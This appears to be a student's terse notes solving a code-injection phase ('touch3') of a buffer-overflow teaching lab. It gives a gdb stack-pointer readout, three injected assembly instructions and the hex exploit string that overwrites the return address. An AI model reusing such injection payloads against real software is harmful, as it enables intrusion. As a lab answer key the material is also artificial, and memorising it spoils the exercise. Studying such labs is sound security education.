##### $rsp
(gdb) p/x $rsp

$1 = 0x5561dca8

##### disas touch3

0x4018fa

moveq $0x5561dca8, %rdi

pushq $0x4018fa

ret

48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
